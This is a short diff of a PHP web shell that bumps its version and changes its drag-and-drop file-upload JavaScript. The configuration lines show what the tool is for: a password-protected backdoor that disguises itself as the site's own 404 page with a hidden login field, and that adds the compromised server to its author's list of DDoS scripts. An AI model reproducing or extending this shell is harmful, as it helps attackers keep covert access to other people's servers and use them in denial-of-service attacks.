@@ -1,6 +1,6 @@
 <?php
 $pass               = md5("hf");
-$version            = 3.3;
+$version            = 3.31;
 $adaptiveerrorpage  = true; //Get Default 404 page and replicate it, but add a login text field in the center at the bottom
 $checkforupdates    = true;
 $helpsupportbooter  = true; //True adds the shell to my ddos scripts list, I can't log in providing you change the password above
@@ -375,14 +375,18 @@ function Init() {
 	filedrag.addEventListener("drop", FileSelectHandler, false);
 }
 function FileDragHover(e) {
-	e.stopPropagation();
-	e.preventDefault();
-	e.target.className = (e.type == "dragover" ? "hover" : "");
+    if(e.target.type != "file"){
+    	e.stopPropagation();
+    	e.preventDefault();
+    	e.target.className = (e.type == "dragover" ? "hover" : "");
+	}
 }
 function FileSelectHandler(e) {
-	FileDragHover(e);
-	var files = e.target.files || e.dataTransfer.files;
-	UploadFiles(files);
+    if(e.target.type != "file"){
+    	FileDragHover(e);
+    	var files = e.target.files || e.dataTransfer.files;
+    	UploadFiles(files);
+	}
 }
 function UploadFiles(files) {
 	var xhr = new XMLHttpRequest();
